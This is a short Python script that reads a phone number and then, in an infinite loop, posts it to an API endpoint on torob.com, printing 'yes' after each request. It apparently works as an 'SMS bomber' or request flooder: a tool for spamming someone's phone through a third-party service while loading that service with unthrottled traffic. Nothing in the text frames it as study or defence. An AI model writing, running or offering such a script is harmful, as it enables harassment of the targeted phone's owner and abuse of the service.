import requests
from termcolor import colored

url = 'https://api.torob.com/v4/user/details/'

phonen = input('phone number: ')

pnd = {'cellphone': f'{phonen}'}

while True:

      req = requests.post(url, json= pnd)

      print(colored('yes', 'red'))

